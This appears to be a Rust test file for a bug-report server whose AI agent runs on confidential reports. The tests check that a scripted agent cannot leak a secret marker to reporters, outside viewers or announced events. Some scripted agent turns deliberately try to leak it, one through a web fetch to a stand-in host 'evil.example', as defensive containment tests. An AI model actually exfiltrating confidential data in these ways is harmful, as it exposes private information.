#[tokio::test]
async fn a_queue_with_no_target_follows_nothing() {
    let (d, r, _, tid) = fixed(Offer::CHANGE, vec![]).await;
    d.reopen(&r, &tid, "Still broken").await;
    d.nth_run_ended(&tid, 0).await;
    let (st, bot, ctx) = (
        d.ts.store.clone(),
        d.ts.state.bot.clone(),
        d.ts.state.feedback_ctx(),
    );
    let t = tid.clone();
    let made = tokio::task::spawn_blocking(move || {
        let none = FakeWorkspace::offering(Offer::default());
        clax_server::bot::report_follow_up(&st, &bot, &ctx, &none, &t).unwrap()
    })
    .await
    .unwrap();
    assert_eq!(made, None);
}

#[tokio::test]
async fn a_reporters_word_a_crash_stranded_is_found_when_the_driver_starts() {
    let (d, _, _, tid) = fixed(Offer::CHANGE, vec![Turn::finish("Looked at it again.")]).await;
    let (st, q, t) = (d.ts.store.clone(), d.qid.clone(), tid.clone());
    tokio::task::spawn_blocking(move || {
        st.reopen_report(
            &AuditCtx::DAEMON,
            &q,
            &t,
            clax_store::queues::Verdict::Reporter("emp-1"),
            "Still broken".to_string(),
            None,
            None,
            None,
        )
        .unwrap();
    })
    .await
    .unwrap();
    assert_eq!(d.ts.store.runs_for_thread(&tid, 10).unwrap().len(), 1);
    d.driver.start(false).await.unwrap();
    let second = d.nth_run_ended(&tid, 1).await;
    assert_eq!(second.woken_by, Some(WokenBy::Reopen));
}

#[tokio::test]
async fn a_claimed_report_refuses_a_proposal_before_anything_is_pushed() {
    let d = Daemon::start(vec![
        Turn::script("tu_fix", "Fix", TRY_PROPOSE),
        Turn::finish("Could not."),
    ])
    .await;
    let w = Arc::new(FakeWorkspace::default());
    d.late.set(w.clone());
    let r = d.reporter().await;
    let report = d.file(&r).await;
    let tid = id_of(&report).to_string();
    let sid = d.ts.register_session("claude", "someone").await["id"]
        .as_str()
        .unwrap()
        .to_string();
    d.ts.store
        .claim(&AuditCtx::DAEMON, &d.qid, &tid, &sid)
        .unwrap();
    let run = d.send(&report).await;
    d.ended(&run).await;
    assert_eq!(d.script_value(&run), json!("thread_taken"));
    assert!(w.calls.lock().unwrap().proposals.is_empty());
}

#[tokio::test]
async fn a_reporters_reply_in_a_confidential_run_is_acknowledged_in_fixed_words_once() {
    let (d, r, _, tid) = fixed(Offer::CHANGE.confidential(), vec![]).await;
    d.reply(&r, &tid, "Does it cover refunds?").await;
    let said = |d: &Daemon| {
        d.report(&tid)
            .comments
            .iter()
            .filter(|c| c.body == REPLY_RECEIVED)
            .count()
    };
    d.when(|| (said(&d) > 0).then_some(())).await;
    assert_eq!(d.follow(&tid).await, None);
    assert_eq!(said(&d), 1);
    assert_eq!(
        d.read_as(&r, &tid).await["comments"][3]["body"],
        REPLY_RECEIVED
    );
}

#[tokio::test]
async fn a_reporter_reads_fixed_words_and_a_link_from_a_confidential_run() {
    let leak = format!(
        r#"const s = {SECRET:?};
           const tid = (await clax.threads.list())[0].id;
           await clax.threads.reply(tid, s);
           return await clax.change.propose({{title: s, summary: s}});"#
    );
    let d = Daemon::start(vec![
        Turn::script("tu_1", "Leak", &leak),
        Turn::finish(SECRET),
    ])
    .await;
    d.with(FakeWorkspace::offering(
        Offer::CHANGE.confidential().reviewed_previews(),
    ));
    let r = d.reporter().await;
    let report = d.file(&r).await;
    let tid = id_of(&report).to_string();
    let run = d.send(&report).await;
    assert_eq!(d.ended(&run).await.status, RunStatus::Finished);

    let seen = d.read_as(&r, &tid).await;
    let text = seen.to_string();
    assert!(!text.contains(SECRET), "{text}");
    let comments = seen["comments"].as_array().unwrap();
    assert_eq!(comments.len(), 2, "{text}");
    assert_eq!(comments[1]["body"], FIX_PROPOSED);
    // The queue's members read what the run wrote, on the report.
    let notes = d.report(&tid).comments;
    assert!(notes.iter().any(|c| c.triage_only && c.body == SECRET));
    let fix = &seen["fixes"][0];
    assert_eq!(fix["summary"], FIX_PROPOSED, "{text}");
    assert_eq!(fix["verify_url"], "https://pr-1.preview.example", "{text}");
    assert!(fix.get("url").is_none_or(Value::is_null), "{text}");
    assert!(fix.get("commit").is_none_or(Value::is_null), "{text}");
    // Nor on the thread, however a person of the artifact reads it.
    let t = d.ts.store.get_thread(&tid).unwrap().unwrap();
    assert!(t.comments.iter().all(|c| !c.body.contains(SECRET)));
}

#[tokio::test]
async fn a_preview_up_after_its_fix_takes_its_place_on_the_fix_once() {
    let (d, r, _, tid) = fixed(Offer::CHANGE.confidential().reviewed_previews(), vec![]).await;
    let run = d.nth_run_ended(&tid, 0).await;
    let host = clax_server::bot::ServerHost::new(d.ts.state.clone());
    let audit = clax_bot::run::bot_ctx(&run.person);
    for _ in 0..2 {
        host.preview_ready(&run, &audit, "https://pr-2.preview.example", true)
            .await
            .unwrap();
    }
    let seen = d.read_as(&r, &tid).await;
    assert_eq!(
        seen["fixes"][0]["verify_url"],
        "https://pr-2.preview.example"
    );
    let comments = seen["comments"].as_array().unwrap();
    assert_eq!(comments.len(), 3, "{seen}");
    assert_eq!(
        comments[2]["body"],
        format!("{PREVIEW_READY} https://pr-2.preview.example")
    );
    assert_eq!(comments[2]["author_kind"], "agent");
}

#[tokio::test]
async fn a_preview_no_person_approved_is_told_to_the_members_alone() {
    let (d, r, _, tid) = fixed(Offer::CHANGE.confidential(), vec![]).await;
    let run = d.nth_run_ended(&tid, 0).await;
    let host = clax_server::bot::ServerHost::new(d.ts.state.clone());
    let audit = clax_bot::run::bot_ctx(&run.person);
    let url = "https://pr-2.preview.example";
    for _ in 0..2 {
        host.preview_ready(&run, &audit, url, false).await.unwrap();
    }
    let seen = d.read_as(&r, &tid).await;
    assert!(!seen.to_string().contains("preview.example"), "{seen}");
    assert_eq!(seen["fixes"][0]["summary"], FIX_PROPOSED);
    let notes = d.report(&tid).comments;
    let told = notes
        .iter()
        .filter(|c| c.triage_only && c.body.contains(url))
        .count();
    assert_eq!(told, 1, "{notes:?}");
}

/// A finished confidential run on a report, and who may and may not read it.
struct Way {
    d: Daemon,
    r: Reporter,
    report: Value,
    tid: String,
    rid: String,
    /// A browser cookie of the person the run acts for, a member; `None`:
    /// the owner, whose queue it is.
    member: Option<String>,
    bus: tokio::sync::broadcast::Receiver<clax_core::events::Stamped>,
}

/// A confidential run made of `turns` over `w` works on a report and ends:
/// on a queue Pat made, for Pat, or with `owners` on one the owner made,
/// for the owner.
async fn way(turns: Vec<Turn>, w: impl Workspace + 'static, owners: bool) -> Way {
    let mut d = Daemon::start(turns).await;
    let mut member = None;
    let mut person = "*owner".to_string();
    if !owners {
        let pat = d.ts.person("Pat").await;
        let (st, p) = (d.ts.store.clone(), pat.public_id.clone());
        tokio::task::spawn_blocking(move || {
            st.set_flags(&AuditCtx::DAEMON, &p, &[(Flag::Claxbot, true)])
                .unwrap();
        })
        .await
        .unwrap();
        d.queue_of(&pat.public_id);
        member = Some(format!("clax_viewer={}", pat.cookie));
        person = pat.public_id;
    }
    d.with(w);
    d.reporters_see_all().await;
    let bus = d.ts.state.events.subscribe();
    let r = d.reporter().await;
    let report = d.file(&r).await;
    let tid = id_of(&report).to_string();
    let aid = report["artifact"]["id"].as_str().unwrap().to_string();
    let rid = d.run_for(&person, None, &aid, &tid);
    let ended = d.ended(&rid).await;
    assert!(ended.confidential, "{ended:?}");
    Way {
        d,
        r,
        report,
        tid,
        rid,
        member,
        bus,
    }
}

impl Way {
    /// Nothing with [`MARKER`] reaches this reporter, another reporter of a
    /// queue whose reporters see all, a browser that reads the artifact, a
    /// connected person who reads it and is no member, the instance's
    /// admin when no member, no one, or anything the daemon announced.
    async fn closed(&mut self) {
        let (d, rid) = (&self.d, &self.rid);
        let seen = d.read_as(&self.r, &self.tid).await.to_string();
        assert!(!seen.contains(MARKER), "the reporter's view: {seen}");
        let other = d.reporter_named("emp-2").await;
        let seen = d.read_as(&other, &self.tid).await.to_string();
        assert!(!seen.contains(MARKER), "another reporter's view: {seen}");
        for path in [
            format!("/api/bot/runs/{rid}"),
            format!("/api/bot/runs/{rid}/events"),
        ] {
            let res = d
                .as_reporter(&self.r, reqwest::Method::GET, &path, None, Vec::new())
                .await;
            assert!(res.status().is_client_error(), "{path}: {}", res.status());
        }
        let browser = format!("clax_viewer={}", d.ts.viewer(Some("Lee")).await.cookie);
        d.reads_nothing("a viewer", Some(&browser), rid, &self.report)
            .await;
        let rae = d.ts.person("Rae").await;
        let reads = clax_core::rights::Rights::parse(&json!([
            {"type": "clax-artifacts", "actions": ["read"], "locations": ["*"]},
            {"type": "clax-comments", "actions": ["read"], "locations": ["*"]},
        ]))
        .unwrap();
        let (st, p) = (d.ts.store.clone(), rae.public_id.clone());
        tokio::task::spawn_blocking(move || {
            st.set_person_rights(&AuditCtx::DAEMON, &p, Some(reads))
                .unwrap();
        })
        .await
        .unwrap();
        let reader = format!("clax_viewer={}", rae.cookie);
        d.reads_nothing(
            "a person outside the queue",
            Some(&reader),
            rid,
            &self.report,
        )
        .await;
        let owner = d.ts.owner_cookie();
        // A connected person's rights reach the owner's artifacts: on Pat's
        // queue Rae does not reach the run at all.
        let mut outside = vec![browser];
        if self.member.is_none() {
            outside.push(reader);
        }
        if self.member.is_some() {
            d.reads_nothing(
                "an admin outside the queue",
                Some(&owner),
                rid,
                &self.report,
            )
            .await;
            outside.push(owner);
        }
        d.reads_nothing("no one", None, rid, &self.report).await;
        let ended = d.ts.store.run(rid).unwrap().unwrap();
        for who in &outside {
            let (status, run) = d
                .read_with(Some(who), &format!("/api/bot/runs/{rid}"))
                .await;
            assert_eq!(status, 200, "sealed_from is reached: {run}");
            let run: Value = serde_json::from_str(&run).unwrap();
            assert_eq!(run["sealed"], true, "{run}");
            assert_eq!(run["status"], ended.status.as_str(), "{run}");
            assert!(run.get("steps").is_none(), "{run}");
            assert!(run["reason"].is_null(), "{run}");
        }
        use tokio::sync::broadcast::error::TryRecvError;
        loop {
            match self.bus.try_recv() {
                Ok(e) => {
                    let text = serde_json::to_string(&e.event).unwrap();
                    assert!(!text.contains(MARKER), "announced: {text}");
                }
                Err(TryRecvError::Empty) => break,
                Err(e) => panic!("the bus check did not see every event: {e:?}"),
            }
        }
    }

    /// The member reads the marker, in the run or on the report.
    async fn member_reads(&self) {
        let cookie = self
            .member
            .clone()
            .unwrap_or_else(|| self.d.ts.owner_cookie());
        let path = format!("/api/bot/runs/{}", self.rid);
        let (_, full) = self.d.read_with(Some(&cookie), &path).await;
        assert!(full.contains("steps"), "{full}");
        let notes = serde_json::to_string(&self.d.report(&self.tid)).unwrap();
        assert!(
            full.contains(MARKER) || notes.contains(MARKER),
            "a member reads it: {full} {notes}"
        );
    }
}

/// [`way`] on Pat's queue, closed, and read by Pat.
async fn no_way_out(turns: Vec<Turn>, member_reads: bool) {
    let w = FakeWorkspace::offering(Offer::CHANGE.confidential());
    let mut way = way(turns, w, false).await;
    way.closed().await;
    if member_reads {
        way.member_reads().await;
    }
}

fn leak(code: &str) -> Vec<Turn> {
    vec![Turn::script("tu_1", "Leak", code), Turn::finish("Done.")]
}

const LEAK_ALL: &str = r#"const m = "PRIVATE-SOURCE-MARKER";
    const t = (await clax.threads.list())[0].id;
    await clax.threads.reply(t, m);
    console.log(m);
    await clax.shell.exec(m);
    return await clax.change.propose({title: m, summary: m});"#;

#[tokio::test]
async fn no_way_out_on_a_queue_the_owner_made() {
    let w = FakeWorkspace::offering(Offer::CHANGE.confidential());
    let mut way = way(leak(LEAK_ALL), w, true).await;
    way.closed().await;
    way.member_reads().await;
}

#[tokio::test]
async fn no_way_out_through_a_reply() {
    let code = format!(
        "const t = (await clax.threads.list())[0].id; return await clax.threads.reply(t, {MARKER:?});"
    );
    no_way_out(leak(&code), true).await;
}

#[tokio::test]
async fn no_way_out_through_a_finish() {
    no_way_out(vec![Turn::finish(MARKER)], true).await;
}

#[tokio::test]
async fn no_way_out_through_a_give_up() {
    no_way_out(vec![Turn::give_up(MARKER)], true).await;
}

#[tokio::test]
async fn no_way_out_through_a_scripts_title_or_narration() {
    no_way_out(
        vec![
            Turn::script("tu_1", MARKER, "return 1;"),
            Turn::text(MARKER),
            Turn::finish("Done."),
        ],
        true,
    )
    .await;
}

#[tokio::test]
async fn no_way_out_through_a_scripts_logs_or_value() {
    let code = format!("console.log({MARKER:?}); return {MARKER:?};");
    no_way_out(leak(&code), true).await;
}

#[tokio::test]
async fn no_way_out_through_a_commands_output() {
    let code = format!("return await clax.shell.exec({MARKER:?});");
    no_way_out(leak(&code), true).await;
}

#[tokio::test]
async fn no_way_out_through_a_file_name_in_a_give_up_notice() {
    let code = format!(r#"await clax.files.write({MARKER:?} + ".html", "x"); return 1;"#);
    no_way_out(
        vec![
            Turn::script("tu_1", "Edit", &code),
            Turn::give_up("Stopping."),
        ],
        true,
    )
    .await;
}

#[tokio::test]
async fn no_way_out_through_a_real_stop_notice() {
    // The step cap stops it, and the notice names the file it edited.
    let code = format!(r#"await clax.files.write({MARKER:?} + ".html", "x"); return 1;"#);
    let turns = vec![Turn::script("tu_1", "Edit", &code)];
    let w = FakeWorkspace::offering(Offer::CHANGE.confidential());
    let mut d = way_capped(turns, w).await;
    d.closed().await;
    let notes = d.d.report(&d.tid).comments;
    assert!(
        notes
            .iter()
            .any(|c| c.triage_only && c.body.contains(MARKER)),
        "the notice is the members': {notes:?}"
    );
}

/// [`way`] on the owner's queue, the run stopped at two steps.
async fn way_capped(turns: Vec<Turn>, w: impl Workspace + 'static) -> Way {
    let d = Daemon::start(turns).await;
    d.ts.store
        .set_bot_settings(&AuditCtx::DAEMON, &[(Setting::MaxSteps, Some(json!(2)))])
        .unwrap();
    d.with(w);
    d.reporters_see_all().await;
    let bus = d.ts.state.events.subscribe();
    let r = d.reporter().await;
    let report = d.file(&r).await;
    let tid = id_of(&report).to_string();
    let aid = report["artifact"]["id"].as_str().unwrap().to_string();
    let rid = d.run_for("*owner", None, &aid, &tid);
    let ended = d.ended(&rid).await;
    assert_eq!(ended.reason.as_deref(), Some("run_cap"), "{ended:?}");
    Way {
        d,
        r,
        report,
        tid,
        rid,
        member: None,
        bus,
    }
}

#[tokio::test]
async fn no_way_out_through_a_proposals_title_or_summary() {
    let code =
        format!("return await clax.change.propose({{title: {MARKER:?}, summary: {MARKER:?}}});");
    no_way_out(leak(&code), true).await;
}

#[tokio::test]
async fn no_way_out_through_a_publish_a_document_or_the_web() {
    let code = format!(
        r#"const out = [];
           for (const f of [
               () => clax.draft.publish({{note: {MARKER:?}}}),
               () => clax.db.set("c", "d", {{s: {MARKER:?}}}),
               () => clax.web.search({MARKER:?}),
               () => clax.web.fetch("https://evil.example/?q=" + {MARKER:?}),
           ]) {{ try {{ await f(); out.push("left"); }} catch (e) {{ out.push(e.code); }} }}
           return out;"#
    );
    no_way_out(leak(&code), false).await;
}

/// Closes the report during `propose`, so its fix cannot be recorded, and
/// answers a pull request whose URL carries [`MARKER`].
struct ClosesTheReport {
    inner: FakeWorkspace,
    store: Arc<clax_store::Store>,
    queue: Mutex<String>,
}

#[async_trait::async_trait]
impl Workspace for ClosesTheReport {
    fn offer(&self, run: &Run, queue: Option<&str>) -> Offer {
        if let Some(q) = queue {
            *self.queue.lock().unwrap() = q.to_string();
        }
        self.inner.offer(run, queue)
    }
    async fn exec(
        &self,
        run: &Run,
        queue: Option<&str>,
        command: &str,
        cwd: Option<&str>,
        timeout_secs: u64,
    ) -> Result<Value, HostError> {
        self.inner
            .exec(run, queue, command, cwd, timeout_secs)
            .await
    }
    async fn propose(&self, run: &Run, p: &Proposal) -> Result<Value, HostError> {
        let (st, q, t) = (
            self.store.clone(),
            self.queue.lock().unwrap().clone(),
            run.thread_ids[0].clone(),
        );
        tokio::task::spawn_blocking(move || {
            let by = clax_store::queues::ReportWriter::Person {
                name: "Sam".into(),
                public_id: None,
            };
            st.resolve_report(
                &AuditCtx::DAEMON,
                &q,
                &t,
                &by,
                clax_core::report::ResolveReason::Other,
            )
            .unwrap();
        })
        .await
        .unwrap();
        let mut v = self.inner.propose(run, p).await?;
        v["url"] = json!(format!("https://forge.example/{MARKER}"));
        Ok(v)
    }
    async fn finish(&self, run: &Run) {
        self.inner.finish(run).await;
    }
}

#[tokio::test]
async fn no_way_out_through_the_notice_of_a_fix_that_was_not_recorded() {
    let d = Daemon::start(leak(PROPOSE)).await;
    d.with(ClosesTheReport {
        inner: FakeWorkspace::offering(Offer::CHANGE.confidential()),
        store: d.ts.store.clone(),
        queue: Mutex::new(String::new()),
    });
    d.reporters_see_all().await;
    let bus = d.ts.state.events.subscribe();
    let r = d.reporter().await;
    let report = d.file(&r).await;
    let tid = id_of(&report).to_string();
    let aid = report["artifact"]["id"].as_str().unwrap().to_string();
    let rid = d.run_for("*owner", None, &aid, &tid);
    d.ended(&rid).await;
    assert_eq!(d.script_value(&rid)["fix_recorded"], false);
    let mut way = Way {
        d,
        r,
        report,
        tid,
        rid,
        member: None,
        bus,
    };
    way.closed().await;
    way.member_reads().await;
}

#[tokio::test]
async fn no_way_out_through_a_preview_no_person_approved() {
    let w = FakeWorkspace::offering(Offer::CHANGE.confidential());
    let mut way = way(leak(PROPOSE), w, false).await;
    let run = way.d.ts.store.run(&way.rid).unwrap().unwrap();
    let host = clax_server::bot::ServerHost::new(way.d.ts.state.clone());
    let audit = clax_bot::run::bot_ctx(&run.person);
    let url = format!("https://pr-1.preview.example/{MARKER}");
    host.preview_ready(&run, &audit, &url, false).await.unwrap();
    way.closed().await;
    way.member_reads().await;
}

#[tokio::test]
async fn no_way_out_through_a_follow_up_run() {
    let turns = vec![
        Turn::script("tu_1", "Fix", PROPOSE),
        Turn::finish("Proposed."),
        Turn::finish(MARKER),
    ];
    let w = FakeWorkspace::offering(Offer::CHANGE.confidential().reviewed_previews());
    let mut way = way(turns, w, false).await;
    way.d.reopen(&way.r, &way.tid, "Still broken").await;
    let second = way.d.nth_run_ended(&way.tid, 1).await;
    assert!(second.confidential);
    way.rid = second.id;
    way.closed().await;
    way.member_reads().await;
}

#[tokio::test]
async fn a_reopen_run_reads_what_the_last_run_told_the_queues_members() {
    let reply = format!(
        r#"const t = (await clax.threads.list())[0].id;
           await clax.threads.reply(t, {MARKER:?});
           return await clax.change.propose({{title: "t", summary: "s"}});"#
    );
    let read = r#"const t = (await clax.threads.list())[0].id;
                  return (await clax.threads.read(t)).comments.map(c => c.text);"#;
    let turns = vec![
        Turn::script("tu_1", "Fix", &reply),
        Turn::finish("Proposed."),
        Turn::script("tu_2", "Read", read),
        Turn::finish("Read."),
    ];
    let w = FakeWorkspace::offering(Offer::CHANGE.confidential().reviewed_previews());
    let way = way(turns, w, false).await;
    way.d.reopen(&way.r, &way.tid, "Still broken").await;
    let second = way.d.nth_run_ended(&way.tid, 1).await;
    assert!(way.d.fake.requests()[2].to_string().contains(MARKER));
    assert!(way.d.script_value(&second.id).to_string().contains(MARKER));
}

#[tokio::test]
async fn a_run_outside_the_queue_reads_no_note() {
    let reply = format!(
        r#"const t = (await clax.threads.list())[0].id;
           return await clax.threads.reply(t, {MARKER:?});"#
    );
    let read = r#"const t = (await clax.threads.list())[0].id;
                  return (await clax.threads.read(t)).comments.map(c => c.text);"#;
    let turns = vec![
        Turn::script("tu_1", "Note", &reply),
        Turn::finish("Noted."),
        Turn::script("tu_2", "Read", read),
        Turn::finish("Read."),
    ];
    let w = FakeWorkspace::offering(Offer::CHANGE.confidential());
    let way = way(turns, w, false).await;
    // The owner's run: the queue is Pat's.
    let aid = way.report["artifact"]["id"].as_str().unwrap();
    let outside = way.d.run_for("*owner", None, aid, &way.tid);
    way.d.ended(&outside).await;
    assert!(!way.d.fake.requests()[2].to_string().contains(MARKER));
    assert!(!way.d.script_value(&outside).to_string().contains(MARKER));
}

/// A browser's `POST path` as `cookie`'s holder: its status.
async fn posted(d: &Daemon, cookie: &str, path: &str, body: Value) -> u16 {
    let res =
        d.ts.client
            .post(format!("{}{path}", d.ts.base))
            .header("cookie", cookie)
            .json(&body)
            .send()
            .await
            .unwrap();
    res.status().as_u16()
}

#[tokio::test]
async fn the_runs_of_a_report_tell_each_caller_only_what_they_may_read_and_do() {
    let note = format!(
        r#"const t = (await clax.threads.list())[0].id;
           return await clax.threads.reply(t, {MARKER:?});"#
    );
    let turns = vec![
        Turn::script("tu_1", "Note", &note),
        Turn::finish("Noted."),
        Turn::finish("Sent."),
    ];
    let w = FakeWorkspace::offering(Offer::CHANGE.confidential());
    let way = way(turns, w, false).await;
    let d = &way.d;
    let aid = way.report["artifact"]["id"].as_str().unwrap().to_string();
    let tid = way.tid.clone();
    let path = format!("/api/bot/runs?artifact={aid}&thread={tid}");
    let pat = way.member.clone().unwrap();
    let list = async |cookie: Option<&str>| {
        let (status, text) = d.read_with(cookie, &path).await;
        assert!(!text.contains(MARKER), "{text}");
        (
            status,
            serde_json::from_str::<Value>(&text).unwrap_or_default(),
        )
    };

    // Nobody with no right to the report gets a run of it.
    assert_eq!(list(None).await.0, 401);
    let eve = d.ts.person("Eve").await;
    let eve = format!("clax_viewer={}", eve.cookie);
    assert_eq!(list(Some(&eve)).await.0, 404);
    let pq = path.clone();
    let res = d
        .as_reporter(&way.r, reqwest::Method::GET, &pq, None, Vec::new())
        .await;
    assert!(res.status().is_client_error(), "{}", res.status());

    // The person it acts for, in the queue, reads it and may stop it.
    let (status, seen) = list(Some(&pat)).await;
    assert_eq!(status, 200, "{seen}");
    assert_eq!(seen["runs"][0]["id"], way.rid.as_str());
    assert_eq!(seen["runs"][0].get("sealed"), None, "{seen}");
    assert_eq!(seen["runs"][0]["may_stop"], true, "{seen}");

    // The owner, with no role in the queue, reads its status alone.
    let owner = d.ts.owner_cookie();
    let (status, seen) = list(Some(&owner)).await;
    assert_eq!(status, 200, "{seen}");
    assert_eq!(seen["runs"][0]["sealed"], true, "{seen}");
    assert_eq!(seen["runs"][0]["thread_ids"], json!([]), "{seen}");
    assert_eq!(seen["runs"][0]["reason"], Value::Null, "{seen}");

    // A thread of another artifact lists nothing here.
    let elsewhere = format!("/api/bot/runs?artifact={aid}&thread=no-such-thread");
    let (status, text) = d.read_with(Some(&owner), &elsewhere).await;
    assert_eq!(status, 200);
    assert_eq!(
        serde_json::from_str::<Value>(&text).unwrap()["runs"],
        json!([])
    );

    // What each row says of stopping is what stopping does.
    let member = d.ts.person("Sam").await;
    let (st, q, id) = (d.ts.store.clone(), d.qid.clone(), member.public_id.clone());
    tokio::task::spawn_blocking(move || {
        st.set_member(&AuditCtx::DAEMON, &q, &id, Some(Role::Triage))
            .unwrap();
    })
    .await
    .unwrap();
    let sam = format!("clax_viewer={}", member.cookie);
    let pat_id = d.ts.store.run(&way.rid).unwrap().unwrap().person;
    let held = d.run_held(&pat_id, None, &aid, &tid);
    d.ts.store.mark_run_confidential(&held).unwrap();
    let row = async |cookie: &str| {
        let seen = list(Some(cookie)).await.1;
        let runs = seen["runs"].as_array().cloned().unwrap_or_default();
        runs.into_iter().find(|r| r["id"] == held.as_str()).unwrap()
    };
    let cancel = format!("/api/bot/runs/{held}/cancel");
    // A member who does not read the artifact is refused all of it alike.
    assert_eq!(list(Some(&sam)).await.0, 404);
    assert_eq!(posted(d, &sam, &cancel, json!({})).await, 404);
    let owners = row(&owner).await;
    assert_eq!(owners["sealed"], true, "{owners}");
    assert_eq!(owners["may_stop"], true, "{owners}");
    assert_eq!(posted(d, &owner, &cancel, json!({})).await, 200);
    d.ended(&held).await;

    // And what it says of sending is what sending does.
    let body = json!({"thread_ids": [tid], "artifact_id": aid});
    assert_eq!(list(Some(&owner)).await.1["may_send"], true);
    assert_eq!(posted(d, &owner, "/api/bot/runs", body.clone()).await, 201);
    assert_eq!(posted(d, &sam, "/api/bot/runs", body.clone()).await, 404);
    assert_eq!(list(Some(&eve)).await.1.get("may_send"), None);
    assert_eq!(posted(d, &eve, "/api/bot/runs", body).await, 404);
}

#[tokio::test]
async fn a_member_who_reads_a_report_may_follow_its_run_and_is_told_they_may_not_stop_it() {
    let (d, _, report, tid) = fixed(Offer::CHANGE, vec![]).await;
    let aid = report["artifact"]["id"].as_str().unwrap().to_string();
    let sam = d.ts.person("Sam").await;
    let reads = clax_core::rights::Rights::parse(&json!([
        {"type": "clax-artifacts", "actions": ["read"], "locations": ["*"]},
    ]))
    .unwrap();
    let (st, q, id) = (d.ts.store.clone(), d.qid.clone(), sam.public_id.clone());
    tokio::task::spawn_blocking(move || {
        st.set_person_rights(&AuditCtx::DAEMON, &id, Some(reads))
            .unwrap();
        st.set_member(&AuditCtx::DAEMON, &q, &id, Some(Role::Triage))
            .unwrap();
    })
    .await
    .unwrap();
    let cookie = format!("clax_viewer={}", sam.cookie);
    let held = d.run_held("*owner", None, &aid, &tid);
    let path = format!("/api/bot/runs?artifact={aid}&thread={tid}");
    let (status, text) = d.read_with(Some(&cookie), &path).await;
    assert_eq!(status, 200, "{text}");
    let seen: Value = serde_json::from_str(&text).unwrap();
    let rows = seen["runs"].as_array().unwrap();
    let row = rows.iter().find(|r| r["id"] == held.as_str()).unwrap();
    assert_eq!(row["may_stop"], false, "{row}");
    let cancel = format!("/api/bot/runs/{held}/cancel");
    assert_eq!(posted(&d, &cookie, &cancel, json!({})).await, 403);
    assert_eq!(seen["may_send"], false, "{seen}");
    let body = json!({"thread_ids": [tid], "artifact_id": aid});
    assert_eq!(posted(&d, &cookie, "/api/bot/runs", body).await, 403);
}

#[tokio::test]
async fn an_agent_is_refused_the_runs_of_a_report_as_it_is_their_stop() {
    let d = Daemon::start(vec![]).await;
    d.with(FakeWorkspace::default());
    let r = d.reporter().await;
    let report = d.file(&r).await;
    let (aid, tid) = (report["artifact"]["id"].as_str().unwrap(), id_of(&report));
    let (c, _) = person(&d, "Pat", true).await;
    let path = format!("/api/bot/runs?artifact={aid}&thread={tid}");
    let res = c.get(None, &path).await;
    assert_eq!(res.status(), 403);
}

#[tokio::test]
async fn a_held_fix_refuses_a_reporters_verdict_at_the_routes() {
    let (d, r, _, tid) = fixed(Offer::CHANGE.confidential(), vec![]).await;
    let seen = d.read_as(&r, &tid).await;
    assert_eq!(seen["fixes"][0]["held"], true, "{seen}");
    let pq = format!("{}/{tid}/reopen", d.reports());
    let res = d.multipart(&r, &pq, &[("body", "Still broken")]).await;
    assert_eq!(res.status(), 409);
    let pq = format!("{}/{tid}/verify", d.reports());
    let res = d
        .as_reporter(
            &r,
            reqwest::Method::POST,
            &pq,
            Some("application/json"),
            b"{}".to_vec(),
        )
        .await;
    assert_eq!(res.status(), 409);
    assert_eq!(d.report(&tid).state, State::FixProposed);
}

#[tokio::test]
async fn a_step_run_again_may_propose_a_fix_already_on_a_report_someone_then_claimed() {
    use clax_bot::OpCtx;
    let (d, _, _, tid) = fixed(Offer::CHANGE, vec![]).await;
    let run = d.nth_run_ended(&tid, 0).await;
    let host = clax_server::bot::ServerHost::new(d.ts.state.clone());
    let audit = clax_bot::run::bot_ctx(&run.person);
    // The first run's only proposal was its script's first call, in step 2.
    let cx = OpCtx::new(&run, &audit, 2, 1, 0);
    assert!(d.ts.store.fix_proposed_under(&tid, &cx.key).unwrap());
    d.reopen_straight(&tid).await;
    let sid = d.ts.register_session("claude", "someone").await["id"]
        .as_str()
        .unwrap()
        .to_string();
    d.ts.store
        .claim(&AuditCtx::DAEMON, &d.qid, &tid, &sid)
        .unwrap();
    host.check_fix(&cx).await.unwrap();
    let other = OpCtx::new(&run, &audit, 2, 1, 1);
    assert_eq!(
        host.check_fix(&other).await.unwrap_err().code,
        "thread_taken"
    );
}

#[tokio::test]
async fn a_finished_runs_acting_person_keeps_their_view_when_its_thread_is_gone() {
    let (d, _, _, tid) = fixed(Offer::CHANGE.confidential(), vec![]).await;
    let run = d.nth_run_ended(&tid, 0).await;
    let c = rusqlite::Connection::open(d.ts.home.db_path()).unwrap();
    c.busy_timeout(Duration::from_secs(10)).unwrap();
    c.execute_batch(&format!(
        "PRAGMA foreign_keys = OFF; DELETE FROM comments WHERE thread_id = '{tid}';
         DELETE FROM report_fixes WHERE thread_id = '{tid}'; DELETE FROM threads WHERE id = '{tid}'"
    ))
    .unwrap();
    let owner = d.ts.owner_cookie();
    let (_, full) = d
        .read_with(Some(&owner), &format!("/api/bot/runs/{}", run.id))
        .await;
    assert!(full.contains("steps"), "{full}");
    let browser = format!("clax_viewer={}", d.ts.viewer(None).await.cookie);
    let (_, seen) = d
        .read_with(Some(&browser), &format!("/api/bot/runs/{}", run.id))
        .await;
    assert!(seen.contains("\"sealed\":true"), "{seen}");
}

/// Answers a run's `exec` and revokes `person` at its first command.
struct RevokesAtFirstCommand {
    inner: FakeWorkspace,
    store: Arc<clax_store::Store>,
    person: String,
}

#[async_trait::async_trait]
impl Workspace for RevokesAtFirstCommand {
    fn offer(&self, run: &Run, queue: Option<&str>) -> Offer {
        self.inner.offer(run, queue)
    }
    async fn exec(
        &self,
        run: &Run,
        queue: Option<&str>,
        command: &str,
        cwd: Option<&str>,
        timeout_secs: u64,
    ) -> Result<Value, HostError> {
        let (st, person) = (self.store.clone(), self.person.clone());
        tokio::task::spawn_blocking(move || st.revoke_person(&AuditCtx::DAEMON, &person).unwrap())
            .await
            .unwrap();
        self.inner
            .exec(run, queue, command, cwd, timeout_secs)
            .await
    }
    async fn propose(&self, run: &Run, p: &Proposal) -> Result<Value, HostError> {
        self.inner.propose(run, p).await
    }
    async fn finish(&self, run: &Run) {
        self.inner.finish(run).await;
    }
}

const TRY_SHELL: &str = r#"try { await clax.shell.exec("ls"); return "ran"; }
                           catch (e) { return e.code; }"#;

const TRY_SHELL_TWICE: &str = r#"await clax.shell.exec("first");
    try { await clax.shell.exec("second"); return "ran"; } catch (e) { return e.code; }"#;

/// A connected person with ClaxBot on, a member of `d`'s queue when
/// `member`: their machine, and their public ID.
async fn person(d: &Daemon, name: &str, member: bool) -> (clax_testkit::TestClient, String) {
    let c = d.ts.connect_person(name, "clax:full").await;
